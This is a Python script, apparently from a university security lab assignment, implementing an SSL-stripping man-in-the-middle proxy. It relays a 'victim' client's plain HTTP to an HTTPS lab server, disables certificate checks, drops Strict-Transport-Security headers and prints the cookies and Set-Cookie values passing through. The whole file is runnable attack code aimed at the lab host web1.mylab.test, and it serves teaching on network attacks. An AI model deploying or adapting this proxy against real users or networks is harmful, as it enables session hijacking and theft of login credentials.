#!/usr/bin/env python3
"""
It listens for HTTP requests from a client (e.g. pc2) and forwards them
over HTTPS to the real web1.mylab.test server, then relays the response
back to the client.
"""

import argparse
import http.server
import socketserver
import threading
import ssl
import sys
from urllib.parse import urlsplit, urlunsplit

import requests


class LabProxyHandler(http.server.BaseHTTPRequestHandler):
    """
    Simple HTTP -> HTTPS proxy handler.

    - Receives HTTP requests from the client (victim).
    - Forwards them as HTTPS requests to the upstream server.
    - Sends the upstream response back to the client.
    - Logs Cookie / Set-Cookie headers for educational analysis.
    """

    upstream_host: str = "web1.mylab.test"
    upstream_port: int = 443
    log_bodies: bool = False
    timeout: float = 10.0

    protocol_version = "HTTP/1.1"

    def _read_body(self):
        length = self.headers.get("Content-Length")
        if length is None:
            return b""
        try:
            length = int(length)
        except ValueError:
            return b""
        return self.rfile.read(length)

    def _build_upstream_url(self):
        # reconstruct path + query from the request
        path = self.path
        # If the client sends an absolute URL (proxy-style), strip host part
        parts = urlsplit(path)
        if parts.scheme and parts.netloc:
            
            path = urlunsplit(("", "", parts.path, parts.query, ""))
        # Build HTTPS URL to upstream
        return f"https://{self.upstream_host}:{self.upstream_port}{path}"

    def _make_upstream_request(self, method: str, body: bytes):
        url = self._build_upstream_url()

        # Prepare headers for upstream: copy most, but adjust Host / hop-by-hop
        upstream_headers = {}
        for k, v in self.headers.items():
            lk = k.lower()
            # hop-by-hop headers we don't forward
            if lk in ("connection", "proxy-connection", "keep-alive",
                      "proxy-authenticate", "proxy-authorization", "upgrade",
                      "te", "trailers"):
                continue
            upstream_headers[k] = v

        # Ensure Host header is the upstream host
        upstream_headers["Host"] = self.upstream_host

        # Log cookies going UP from client
        cookie_hdr = upstream_headers.get("Cookie")
        if cookie_hdr:
            print(f"[CLIENT → UPSTREAM] Cookie: {cookie_hdr}", flush=True)

        try:
            resp = requests.request(
                method=method,
                url=url,
                headers=upstream_headers,
                data=body if body else None,
                timeout=self.timeout,
                verify=False,  
                allow_redirects=False,
            )
            return resp
        except requests.RequestException as e:
            print(f"[!] Upstream request error: {e}", file=sys.stderr)
            return None

    def _send_back_response(self, upstream_resp: requests.Response):
        self.send_response(upstream_resp.status_code)

        # Copy headers back to client, but strip hop-by-hop and HSTS-ish ones
        hop_by_hop = {
            "connection",
            "proxy-connection",
            "keep-alive",
            "proxy-authenticate",
            "proxy-authorization",
            "upgrade",
            "te",
            "trailers",
            "transfer-encoding",
        }

        for k, v in upstream_resp.headers.items():
            lk = k.lower()
            if lk in hop_by_hop:
                continue

            # Strict-Transport-Security here to discuss SSL stripping ideas.
            if lk == "strict-transport-security":
                print("[UPSTREAM → CLIENT] Dropping Strict-Transport-Security header (lab only).")
                continue

            # Log Set-Cookie headers coming DOWN from server
            if lk == "set-cookie":
                print(f"[UPSTREAM → CLIENT] Set-Cookie: {v}", flush=True)

            self.send_header(k, v)

        self.send_header("Connection", "close")
        self.end_headers()

        body = upstream_resp.content or b""
        if self.log_bodies:
            print(f"[UPSTREAM BODY] {body[:200]!r} (truncated)", flush=True)

        self.wfile.write(body)

    def _handle_method(self, method: str):
        body = self._read_body()
        upstream_resp = self._make_upstream_request(method, body)
        if upstream_resp is None:
            self.send_error(502, "Bad Gateway (upstream failed)")
            return
        self._send_back_response(upstream_resp)

    def do_GET(self):
        self._handle_method("GET")

    def do_POST(self):
        self._handle_method("POST")

    def do_HEAD(self):
        self._handle_method("HEAD")

    def log_message(self, format, *args):
        sys.stdout.write("[HTTP] " + format % args + "\n")


class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True


def run_proxy(listen_host: str, listen_port: int, upstream_host: str, upstream_port: int,
              log_bodies: bool = False, timeout: float = 10.0):
    LabProxyHandler.upstream_host = upstream_host
    LabProxyHandler.upstream_port = upstream_port
    LabProxyHandler.log_bodies = log_bodies
    LabProxyHandler.timeout = timeout

    server_address = (listen_host, listen_port)
    httpd = ThreadedHTTPServer(server_address, LabProxyHandler)
    print(f"[+] Lab HTTPS proxy listening on {listen_host}:{listen_port}")
    print(f"[+] Forwarding to https://{upstream_host}:{upstream_port}")
    print("[+] Press Ctrl+C to stop.")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Shutting down proxy...")
        httpd.shutdown()


def main():
    parser = argparse.ArgumentParser(
        description="2IC80 Group 16 - Lab HTTPS proxy (HTTP -> HTTPS)."
    )
    parser.add_argument("--listen-host", default="0.0.0.0",
                        help="Local host/IP to bind on (default: 0.0.0.0).")
    parser.add_argument("--listen-port", type=int, default=8080,
                        help="Local port to listen for HTTP clients on (default: 8080).")
    parser.add_argument("--upstream-host", default="web1.mylab.test",
                        help="Upstream HTTPS host (default: web1.mylab.test).")
    parser.add_argument("--upstream-port", type=int, default=443,
                        help="Upstream HTTPS port (default: 443).")
    parser.add_argument("--log-bodies", action="store_true",
                        help="Log (truncated) response bodies for debugging.")
    parser.add_argument("--timeout", type=float, default=10.0,
                        help="Timeout in seconds for upstream HTTPS requests (default: 10).")

    args = parser.parse_args()

    run_proxy(
        listen_host=args.listen_host,
        listen_port=args.listen_port,
        upstream_host=args.upstream_host,
        upstream_port=args.upstream_port,
        log_bodies=args.log_bodies,
        timeout=args.timeout,
    )


if __name__ == "__main__":
    main()
